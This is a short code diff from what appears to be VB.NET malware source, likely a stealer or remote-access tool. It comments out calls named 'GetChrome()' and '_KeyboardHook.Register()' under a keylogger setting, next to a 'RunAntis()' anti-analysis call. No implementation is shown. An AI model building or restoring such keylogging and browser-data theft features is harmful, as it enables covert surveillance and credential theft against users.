@@ -58,8 +58,8 @@ Module Main
             RunAntis()
         End If
         If Config.Variables.Keyloggers Then
-            GetChrome()
-            _KeyboardHook.Register()
+            'GetChrome()
+            '_KeyboardHook.Register()
         End If
         MainThreadCreateWebBrowserForm = New WebBrowserForm
     End Sub
